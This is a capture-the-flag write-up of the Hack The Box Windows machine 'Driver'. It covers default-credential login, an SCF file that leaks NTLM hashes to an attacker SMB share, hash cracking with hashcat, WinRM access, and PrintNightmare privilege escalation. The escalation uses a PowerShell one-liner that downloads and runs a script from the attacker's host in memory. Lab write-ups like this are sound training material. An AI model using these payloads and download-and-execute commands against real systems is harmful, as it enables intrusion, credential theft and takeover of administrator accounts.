---
title: "Driver — Hack The Box [Write-up]"
author: 0x3ashry
description: "Writeup for Driver Hackthebox Machine"
date: 2022-05-31 18:00:00 +0200
categories: [HackTheBox]
tags: [HTB, Windows]
---

![](/img/HTB/Driver/Driver.png)

Driver is an easy rated HTB Windows machine, but it discussed a new techniques in exploiting SMB shares and winRM service in addition to privesc using CVE-2021-34527 - PrintNightmare LPE (PowerShell).

Let's get started. 

#### Used Tools:
- Nmap
- Metasploit
- Hashcat
- Evil-winrm 
- Invoke-WebRequest
- 


## 1. SCANNING & ENUMERATION

I will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute, -p- parameter to scan all the ports not the top 1000 only and append the output to tee command which save the in a file named “nmap” and also show the output on the screen.

![](/img/HTB/Driver/img (1).png)

We found 4 opened ports:
- 80 for http
- 135 for RPC client-server communication
- 445 for SMB
- 5985 for Windows Remote Management (WinRM)

I started with the web page and directly after browsing I found firefox prompting me to enter username and password.

![](/img/HTB/Driver/img (2).png)

I tried by default `admin:admin` and boom it entered !!!

It's a Multifunction printer (MFP) Firmware Update site.

![](/img/HTB/Driver/img (3).png)

Nothing works in the site except the `Firmware Updates tab`, it let's me choose the printer model and upload the update file.

It also says: "Select printer model and upload the respective firmware update to our file share" which means that any uploaded file will directly be uploaded to the file share (SMB), also "Our testing team will review the uploads manually and initiates the testing soon" which means that there is someone who will review (open the update file).

![](/img/HTB/Driver/img (4).png)

Let's continue, What about SMB !!!

I tried to list the SMB shares but it denies for unauthorized users

![](/img/HTB/Driver/img (5).png)


## 2. EXPLOITATION:

I stucked here for a while and then found this article: `https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/`

Which states that if I created an `.SCF` file which will be executed when the user browse it and Adding the `@` symbol in front of the filename will place the .scf file on the top of the share drive.

create @update_MFP.scf:

```
[Shell]
Command=2
IconFile=\\10.10.16.10\share\update.ico
[Taskbar]
Command=ToggleDesktop
```

![](/img/HTB/Driver/img (6).png)

Then Metasploit Framework has a module which can be used to capture challenge-response password hashes from SMB clients.

```bash
sudo msfconsole -q
use auxiliary/server/capture/smb
run
```

![](/img/HTB/Driver/img (7).png)

upload the update_MFP file to the website in the Firmware Updates tab.

![](/img/HTB/Driver/img (8).png)

Return back to the metasploit and see the if it captures anything...

![](/img/HTB/Driver/img (9).png)

Now we want to crack the hash we got for the user `tony`...

First put the hash in a `hash.txt` file and then execute `hashcat` with 5600 parameter for the NetNTLMv2 hash type and used rockyou.txt wordlist

```bash
hashcat -m 5600 hashcat.txt /usr/share/wordlists/rockyou.txt
```

![](/img/HTB/Driver/img (10).png)

Hashcat successfully cracked the NetNTLMv2 hash.

Now we have creds: `tony:liltony`

![](/img/HTB/Driver/img (11).png)

I tried using the new creds to connect to the SMB share but failed...

![](/img/HTB/Driver/img (12).png)

Remember port 5985 for the WinRM Service !!

I found in HackTricks website a trick to gain access using `evil-winrm` tool

link: `https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm`

```bash
evil-winrm -u tony -p 'liltony' -i 10.10.11.106
```

BOOOOOOOOM ! We got the user flag.

![](/img/HTB/Driver/img (13).png)


## 3. PRIVILEGE ESCALATION:

Let's upload WinPEAS script and see if there is a potential way to escalate our privileges...

Ran python server on my local machine and used `Invoke-WebRequest` on Driver to download WinPEAS from my local machine

```bash
Invoke-WebRequest -Uri http://10.10.16.10/winPEASx64.exe -OutFile winPEAS.exe
```

Then Run it...

![](/img/HTB/Driver/img (14).png)

I found in the PowerShell history file at: `C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

![](/img/HTB/Driver/img (15).png)

Reading the file, there is a command ran which adds printer to the system of type `RICOH_PCL6`

![](/img/HTB/Driver/img (16).png)

After some research I found:

`CVE-2021-34527` which is a critical remote code execution and local privilege escalation vulnerability dubbed "PrintNightmare."

Link: `https://github.com/JohnHammond/CVE-2021-34527`

This exploit is pretty sneaky, what is does is it allows us to create a new user with administrator rights onto the system.

Getting the exploit and opening a python server on my local host...

![](/img/HTB/Driver/img (17).png)

After downloading the Powershell script and executing it, it prevents me because running scripts is disabled on this system !!!

![](/img/HTB/Driver/img (18).png)

So I had to find another way...

After some research I found a sneaky way in `hadrian3689` write-up: `https://readysetexploit.wordpress.com/2022/02/26/hack-the-box-driver/`, which says:

Back in our WinRM session, let us go to a folder where we can easily download like the Downloads directory. And run the following Powershell command to download the Powershell script **onto memory** `iex(new-object net.webclient).downloadstring('http://10.10.16.10/nightmare.ps1')`

```bash
iex(new-object net.webclient).downloadstring('http://10.10.16.10/nightmare.ps1')
Invoke-Nightmare -NewUser "0x3ashry" -NewPassword "AdminAdmin"
```

![](/img/HTB/Driver/img (19).png)

Exiting our WinRM session and reconnecting with the new credentials...

![](/img/HTB/Driver/img (20).png)

BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!!! Now we are root :D

Thank you so much for reading and I hope you learned a lot as I did ❤

#### ***0x3ashry***